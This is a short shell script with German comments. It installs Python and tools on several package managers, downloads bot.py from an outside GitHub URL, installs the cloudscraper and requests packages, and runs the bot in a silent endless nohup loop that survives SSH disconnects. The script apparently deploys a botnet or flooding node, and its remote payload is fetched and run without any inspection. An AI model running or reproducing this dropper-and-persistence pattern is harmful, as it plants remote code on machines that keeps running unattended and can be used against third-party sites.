#!/bin/sh

# --- Python/Pip Installation (ohne und mit sudo) ---
apt update
apt install -y python3 python-pip3 screen tmux nohup
apt install -y python python-pip
yum install -y python3 python-pip3 screen tmux nohup
yum install -y python python-pip
pkg install -y python3 python-pip3 screen tmux nohup
pkg install -y python python-pip

sudo apt update
sudo apt install -y python3 python-pip3 screen tmux nohup
sudo apt install -y python python-pip
sudo yum install -y python3 python-pip3 screen tmux nohup
sudo yum install -y python python-pip
sudo pkg install -y python3 python-pip3 screen tmux nohup
sudo pkg install -y python python-pip

# --- Python-Skript herunterladen ---
wget -O bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py || curl -o bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py

# --- Python-Pakete installieren ---
pip3 install cloudscraper requests || true
pip install cloudscraper requests || true

sudo pip3 install cloudscraper requests || true
sudo pip install cloudscraper requests || true

# --- Bot als Endlosschleife im Hintergrund mit nohup starten (überlebt SSH-Disconnect) ---
nohup sh -c 'while true; do python3 bot.py || python bot.py; sleep 5; done' >/dev/null 2>&1 &

exit 0
